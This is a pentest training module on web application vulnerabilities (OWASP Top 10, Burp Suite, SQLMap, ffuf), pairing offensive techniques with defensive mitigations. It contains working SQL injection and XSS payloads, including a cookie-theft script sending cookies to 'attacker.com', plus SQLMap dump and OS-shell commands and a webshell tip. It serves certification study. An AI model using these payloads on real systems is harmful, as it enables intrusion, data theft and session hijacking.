# Module 06: Exploiting Application-Based Vulnerabilities

> **Curriculum alignment:** CEH v13 Domain 10 & 11 / CompTIA PenTest+ PT0-003 — Domain 3.0 Attacks & Exploits
> **Difficulty:** Intermediate–Advanced
> **Estimated study time:** 7 hours

---

## Overview

Web application vulnerabilities are consistently the most common attack vector in real-world breaches. This module covers the OWASP Top 10, manual and automated exploitation techniques, and Burp Suite usage. Topics span SQL injection, XSS, IDOR, SSRF, command injection, and API security. Both offensive exploitation and defensive remediation are covered for each class of vulnerability.

---

## Table of Contents

- [Key Concepts](#key-concepts)
- [Methodology / Process](#methodology--process)
- [Tools & Commands](#tools--commands)
- [Attack Techniques (Offensive)](#attack-techniques-offensive)
- [Detection & Defence (Defensive)](#detection--defence-defensive)
- [CTF Tips & Tricks](#ctf-tips--tricks)
- [Common Mistakes](#common-mistakes)
- [Practice Labs](#practice-labs)
- [References](#references)

---

## Key Concepts

### OWASP Top 10 (2021)

| # | Category | Example |
|---|----------|---------|
| A01 | Broken Access Control | IDOR, privilege escalation, missing function-level access control |
| A02 | Cryptographic Failures | Plaintext passwords, weak TLS, unencrypted sensitive data |
| A03 | Injection | SQLi, OS command injection, LDAP injection |
| A04 | Insecure Design | Missing rate limiting, no security controls in architecture |
| A05 | Security Misconfiguration | Default credentials, exposed debug endpoints, open S3 buckets |
| A06 | Vulnerable and Outdated Components | Unpatched libraries, old CMS versions |
| A07 | Identification and Authentication Failures | Broken auth, weak session management |
| A08 | Software and Data Integrity Failures | Insecure deserialization, CI/CD pipeline compromise |
| A09 | Security Logging and Monitoring Failures | No alerting on brute-force, missing audit logs |
| A10 | Server-Side Request Forgery (SSRF) | Fetching internal resources via user-supplied URL |

### HTTP Request/Response Basics

```
Request:
GET /admin?id=1 HTTP/1.1
Host: example.com
Cookie: session=abc123
Authorization: Bearer eyJ...

Response:
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=def456; HttpOnly; Secure
```

---

## Methodology / Process

1. **Crawl and map** — discover all endpoints, forms, parameters (spider with Burp)
2. **Authentication testing** — test login, registration, password reset flows
3. **Authorisation testing** — IDOR, horizontal and vertical privilege escalation
4. **Input validation** — test all inputs for injection (SQLi, XSS, command injection)
5. **Session management** — analyse cookie entropy, session fixation, JWT weaknesses
6. **File handling** — test upload endpoints for unrestricted file upload
7. **API testing** — test REST/GraphQL endpoints for broken access control and injection
8. **Business logic** — test application-specific workflows for bypass conditions

![Web App Testing Methodology](./images/webapp-testing-methodology.png)
*Figure 1: Web application penetration testing methodology*

---

## Tools & Commands

### Burp Suite

**Purpose:** Intercepting HTTP proxy, scanner, intruder, repeater
**Install:** Pre-installed on Kali Linux (`burpsuite`)

```bash
# Launch Burp Suite Community
burpsuite &

# Key features:
# Proxy > Intercept: capture and modify requests in real time
# Repeater: manually replay and modify requests
# Intruder: automated payload fuzzing (brute force, injection)
# Decoder: encode/decode Base64, URL, hex, etc.
# Scanner (Pro): automated vulnerability scanner
```

**Workflow:**
1. Configure browser to proxy via `127.0.0.1:8080`
2. Install Burp's CA certificate to intercept HTTPS
3. Browse the target application with Intercept on
4. Right-click a captured request → "Send to Repeater" or "Send to Intruder"

---

### SQLMap

**Purpose:** Automated SQL injection detection and exploitation
**Install:** Pre-installed on Kali Linux

```bash
# Basic GET parameter injection
sqlmap -u "http://target.com/page?id=1" --dbs

# POST parameter injection
sqlmap -u "http://target.com/login" --data="username=admin&password=test" --dbs

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# Dump a table
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# Use a saved Burp request file
sqlmap -r burp_request.txt --dbs

# Risk/level tuning
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

# Get OS shell (if DB user has FILE privileges)
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

### ffuf

**Purpose:** Fast web fuzzer for directories, parameters, and virtual hosts
**Install:** Pre-installed on Kali Linux

```bash
# Directory fuzzing
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

# Parameter fuzzing
ffuf -u "http://target.com/page?FUZZ=value" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt

# POST body fuzzing
ffuf -u http://target.com/login -X POST -d "username=FUZZ&password=admin" -w usernames.txt -fc 302

# Virtual host discovery
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -fs 1234
```

---

## Attack Techniques (Offensive)

### Technique 1: SQL Injection (Error-Based)

**Description:** Inject SQL syntax into user-supplied input to manipulate database queries and extract data.
**Prerequisites:** Input parameter that is passed unsanitised to a SQL query.
**MITRE ATT&CK:** [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)

```bash
# Manual detection — single quote test
http://target.com/page?id=1'
# Look for SQL error in response: "You have an error in your SQL syntax"

# Extract database version
http://target.com/page?id=1 UNION SELECT NULL,version(),NULL--

# Extract table names
http://target.com/page?id=1 UNION SELECT NULL,table_name,NULL FROM information_schema.tables--

# Automated with SQLMap
sqlmap -u "http://target.com/page?id=1" --dbs --batch
```

---

### Technique 2: Cross-Site Scripting (XSS)

**Description:** Inject JavaScript into a web page that executes in other users' browsers.
**Prerequisites:** Input field that reflects user data without proper HTML encoding.
**MITRE ATT&CK:** [T1059.007 — JavaScript](https://attack.mitre.org/techniques/T1059/007/)

```html
<!-- Basic reflected XSS test -->
<script>alert('XSS')</script>

<!-- Cookie theft payload -->
<script>fetch('http://attacker.com/?c='+document.cookie)</script>

<!-- Filter bypass examples -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- DOM-based XSS (URL fragment) -->
http://target.com/#<img src=x onerror=alert(1)>
```

---

### Technique 3: Insecure Direct Object Reference (IDOR)

**Description:** Directly access objects (files, records) by manipulating an identifier in a request without proper authorisation checks.
**MITRE ATT&CK:** [T1548 — Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/)

```bash
# Example: access another user's profile
GET /api/user/profile?id=1001   → your profile
GET /api/user/profile?id=1002   → another user's profile (IDOR)

# Example: access another user's invoice
GET /download?file=invoice_1001.pdf
GET /download?file=invoice_1002.pdf  → IDOR to another user's data

# Burp Intruder: enumerate IDs automatically
# Set id parameter as payload position, use number sequence 1–2000
```

---

## Detection & Defence (Defensive)

### Defending Against SQL Injection

**Detection indicators:**
- WAF logs showing SQL keywords in parameters (`UNION`, `SELECT`, `'`, `--`)
- Database error messages in application responses (misconfiguration)
- Unusual query volumes in database slow query log

**Mitigations:**
- Use parameterised queries / prepared statements — **never** concatenate user input into SQL
- Implement a WAF (ModSecurity, AWS WAF) with OWASP Core Rule Set
- Apply least-privilege to database users — the app user should not have `DROP` or `FILE` privileges
- Remove detailed error messages from production responses

### Defending Against XSS

**Mitigations:**
- Encode all user-supplied output (HTML entity encoding)
- Implement a strict Content Security Policy (CSP) header
- Set `HttpOnly` and `Secure` flags on session cookies to prevent JavaScript access
- Validate and sanitise input on both client and server side

**CIS Controls:** CIS Control 16 (Application Software Security), CIS Control 7 (Continuous Vulnerability Management)

---

## CTF Tips & Tricks

- **Wappalyzer / whatweb:** Identify the tech stack immediately — `whatweb http://target`. Version numbers lead to CVE searches.
- **robots.txt and sitemap.xml:** Always check these first — hidden admin panels appear here regularly.
- **SQLi detection:** Try `'`, `"`, `1=1`, `1=2` in every input field before running SQLMap.
- **XSS in CTFs:** If user input is reflected in the page source without encoding, it's likely XSS.
- **JWT tokens:** Decode JWTs at jwt.io — check for `alg: none` vulnerability or weak HS256 secret.
- **File upload:** Try uploading a `.php` webshell — if the server executes it, you have RCE.

---

## Common Mistakes

| Mistake | Why it matters | Correct approach |
|---------|---------------|-----------------|
| Running SQLMap with default settings only | Misses injection points requiring higher level/risk | Use `--level=3 --risk=2` as a baseline |
| Not testing authenticated endpoints | IDOR and broken auth only visible after login | Always test with a valid session cookie |
| Ignoring HTTP response codes | 403 (forbidden) ≠ safe — might be bypassable | Try path traversal, method switching, header manipulation |
| Relying only on automated scanners | Scanners miss logic flaws and chained vulnerabilities | Always combine automated scans with manual testing |

---

## Practice Labs

| Platform | Lab / Room Name | Difficulty | Link |
|----------|----------------|------------|------|
| TryHackMe | OWASP Top 10 | Easy | [Link](https://tryhackme.com/room/owasptop10) |
| TryHackMe | SQL Injection | Easy | [Link](https://tryhackme.com/room/sqlilab) |
| TryHackMe | XSS | Easy | [Link](https://tryhackme.com/room/xss) |
| HackTheBox | DVWA | Easy | [Link](https://www.hackthebox.com) |
| PortSwigger | Web Security Academy | All levels | [Link](https://portswigger.net/web-security) |

---

## References

- [OWASP Web Security Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — Free interactive labs
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — Injection payload repository
- [SQLMap Documentation](https://sqlmap.org/)
- CEH v13 Official Courseware — Module 10 & 11
- CompTIA PenTest+ PT0-003 Study Guide — Chapter 6

---

*Back to [Repository Root](../)*
